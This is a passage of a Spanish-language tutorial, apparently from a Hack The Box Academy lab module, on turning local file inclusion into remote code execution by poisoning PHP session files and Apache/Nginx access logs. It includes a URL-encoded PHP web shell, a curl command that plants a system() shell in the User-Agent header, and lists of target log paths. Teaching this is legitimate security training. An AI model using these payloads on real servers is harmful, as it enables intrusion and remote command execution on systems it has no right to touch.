En secciones anteriores, vimos que si incluimos cualquier archivo que contenga código PHP, este se ejecutará siempre que la función vulnerable tenga privilegios de `Execute`. Los ataques que discutiremos en esta sección se basan en el mismo concepto: Escribir código PHP en un campo que controlamos y que se registra en un archivo de registro (es decir, "poison" / "contaminate" el archivo de registro), y luego incluir ese archivo de registro para ejecutar el código PHP. Para que este ataque funcione, la aplicación web PHP debe tener privilegios de lectura sobre los archivos registrados, lo que varía de un servidor a otro.

Como en el caso de la sección anterior, cualquiera de las siguientes funciones con privilegios de `Execute` debería ser vulnerable a estos ataques:

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodeJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`include`|✅|✅|✅|

---

## PHP Session Poisoning

La mayoría de las aplicaciones web PHP utilizan cookies `PHPSESSID`, las cuales pueden contener datos específicos del usuario en el back-end, para que la aplicación web pueda realizar un seguimiento de los detalles del usuario a través de sus cookies. Estos detalles se almacenan en archivos de `session` en el back-end, y se guardan en `/var/lib/php/sessions/` en Linux y en `C:\Windows\Temp\` en Windows. El nombre del archivo que contiene los datos de nuestro usuario coincide con el nombre de nuestra cookie `PHPSESSID` con el prefijo `sess_`. Por ejemplo, si la cookie `PHPSESSID` está configurada en `el4ukv0kqbvoirg7nkp4dncpk3`, entonces su ubicación en el disco sería `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

Lo primero que necesitamos hacer en un ataque de PHP Session Poisoning es examinar nuestro archivo de sesión `PHPSESSID` y ver si contiene algún dato que podamos controlar y envenenar. Entonces, primero verifiquemos si tenemos una cookie `PHPSESSID` configurada en nuestra sesión:

![image](https://academy.hackthebox.com/storage/modules/23/rfi_cookies_storage.png)

Como podemos ver, el valor de nuestra cookie `PHPSESSID` es `nhhv8i0o6ua4g88bkdl9u1fdsd`, por lo que debería estar almacenado en `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`. Intentemos incluir este archivo de sesión a través de la vulnerabilidad LFI y ver su contenido:

   
`http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`

![](https://academy.hackthebox.com/storage/modules/23/rfi_session_include.png)

**Nota:** Como fácilmente se puede adivinar, el valor de la cookie variará de una sesión a otra, por lo que debes usar el valor de cookie que encuentres en tu propia sesión para realizar el mismo ataque.

Podemos ver que el archivo de sesión contiene dos valores: `page`, que muestra la página de idioma seleccionada, y `preference`, que muestra el idioma seleccionado. El valor de `preference` no está bajo nuestro control, ya que no lo especificamos en ningún lugar y debe ser especificado automáticamente. Sin embargo, el valor de `page` está bajo nuestro control, ya que podemos controlarlo a través del parámetro `?language=`.

Intentemos configurar el valor de `page` a un valor personalizado (por ejemplo, `language parameter`) y ver si cambia en el archivo de sesión. Podemos hacerlo simplemente visitando la página con `?language=session_poisoning` especificado, de la siguiente manera:

```r
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Ahora, volvamos a incluir el archivo de sesión para ver su contenido:

  
`http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`

![](https://academy.hackthebox.com/storage/modules/23/lfi_poisoned_sessid.png)

Esta vez, el archivo de sesión contiene `session_poisoning` en lugar de `es.php`, lo que confirma nuestra capacidad para controlar el valor de `page` en el archivo de sesión. Nuestro siguiente paso es realizar el paso de `poisoning` escribiendo código PHP en el archivo de sesión. Podemos escribir una shell web PHP básica cambiando el parámetro `?language=` a una shell web codificada en URL, de la siguiente manera:

```r
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Finalmente, podemos incluir el archivo de sesión y usar `&cmd=id` para ejecutar comandos:

   
`http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`

![](https://academy.hackthebox.com/storage/modules/23/rfi_session_id.png)

**Nota:** Para ejecutar otro comando, el archivo de sesión debe ser envenenado nuevamente con la shell web, ya que se sobrescribe con `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` después de nuestra última inclusión. Idealmente, usaríamos la shell web envenenada para escribir una shell web permanente en el directorio web, o enviar una reverse shell para una interacción más fácil.

---

## Server Log Poisoning

Tanto `Apache` como `Nginx` mantienen varios archivos de registro, como `access.log` y `error.log`. El archivo `access.log` contiene varias informaciones sobre todas las solicitudes realizadas al servidor, incluyendo el encabezado `User-Agent` de cada solicitud. Como podemos controlar el encabezado `User-Agent` en nuestras solicitudes, podemos usarlo para envenenar los registros del servidor como hicimos antes.

Una vez envenenado, necesitamos incluir los registros a través de la vulnerabilidad LFI, y para eso necesitamos tener acceso de lectura sobre los registros. Los registros de `Nginx` son legibles por usuarios con privilegios bajos por defecto (por ejemplo, `www-data`), mientras que los registros de `Apache` solo son legibles por usuarios con altos privilegios (por ejemplo, grupos `root`/`adm`). Sin embargo, en servidores `Apache` antiguos o mal configurados, estos registros pueden ser legibles por usuarios con privilegios bajos.

Por defecto, los registros de `Apache` se encuentran en `/var/log/apache2/` en Linux y en `C:\xampp\apache\logs\` en Windows, mientras que los registros de `Nginx` se encuentran en `/var/log/nginx/` en Linux y en `C:\nginx\log\` en Windows. Sin embargo, los registros pueden estar en una ubicación diferente en algunos casos, por lo que podemos usar una [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) para fuzzear sus ubicaciones, como se discutirá en la siguiente sección.

Entonces, intentemos incluir el registro de acceso de Apache desde `/var/log/apache2/access.log` y veamos qué obtenemos:

   
`http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log`

![](https://academy.hackthebox.com/storage/modules/23/rfi_access_log.png)

Como podemos ver, podemos leer el registro. El registro contiene la `dirección IP remota`, la `página solicitada`, el `código de respuesta` y el encabezado `User-Agent`. Como se mencionó anteriormente, el encabezado `User-Agent` es controlado por nosotros a través de los encabezados de solicitud HTTP, por lo que deberíamos poder envenenar este valor.

**Consejo:** Los registros tienden a ser enormes, y cargarlos en una vulnerabilidad LFI puede tardar un tiempo en cargarse, o incluso hacer que el servidor se bloquee en los peores escenarios. Por lo tanto, ten cuidado y sé eficiente con ellos en un entorno de producción, y no envíes solicitudes innecesarias.

Para hacerlo, usaremos `Burp Suite` para interceptar nuestra solicitud LFI anterior y modificar el encabezado `User-Agent` a `Apache Log Poisoning`:

![image](https://academy.hackthebox.com/storage/modules/23/rfi_repeater_ua.png)

**Nota:** Como todas las solicitudes al servidor se registran, podemos envenenar cualquier solicitud a la aplicación web, y no necesariamente la LFI como hicimos antes.

Como se esperaba, nuestro valor personalizado de User-Agent es visible en el archivo de registro incluido. Ahora, podemos envenenar el encabezado

 `User-Agent` configurándolo a una shell web PHP básica:

![image](https://academy.hackthebox.com/storage/modules/23/rfi_cmd_repeater.png)

También podemos envenenar el registro enviando una solicitud a través de cURL, de la siguiente manera:

  Log Poisoning

```r
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

Como el registro ahora debería contener código PHP, la vulnerabilidad LFI debería ejecutar este código, y deberíamos poder obtener ejecución remota de código. Podemos especificar un comando para ejecutar con (`?cmd=id`):

![image](https://academy.hackthebox.com/storage/modules/23/rfi_id_repeater.png)

Vemos que ejecutamos el comando exitosamente. El mismo ataque exacto se puede llevar a cabo en los registros de `Nginx` también.

**Consejo:** El encabezado `User-Agent` también se muestra en los archivos de proceso en el directorio `/proc/` de Linux. Por lo tanto, podemos intentar incluir los archivos `/proc/self/environ` o `/proc/self/fd/N` (donde N es un PID generalmente entre 0-50), y podemos realizar el mismo ataque en estos archivos. Esto puede ser útil en caso de que no tuviéramos acceso de lectura sobre los registros del servidor, sin embargo, estos archivos también pueden ser legibles solo por usuarios privilegiados.

Finalmente, existen otras técnicas similares de envenenamiento de registros que podemos utilizar en varios registros del sistema, dependiendo de a cuáles registros tengamos acceso de lectura. Los siguientes son algunos de los registros de servicio a los que podemos tener acceso:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

Debemos intentar leer estos registros a través de LFI primero, y si tenemos acceso a ellos, podemos intentar envenenarlos como hicimos anteriormente. Por ejemplo, si los servicios `ssh` o `ftp` están expuestos a nosotros, y podemos leer sus registros a través de LFI, entonces podemos intentar iniciar sesión en ellos y configurar el nombre de usuario en código PHP, y al incluir sus registros, el código PHP se ejecutaría. Lo mismo se aplica a los servicios de `mail`, ya que podemos enviar un correo electrónico que contenga código PHP, y al incluir su registro, el código PHP se ejecutaría. Podemos generalizar esta técnica a cualquier registro que registre un parámetro que controlamos y que podamos leer a través de la vulnerabilidad LFI.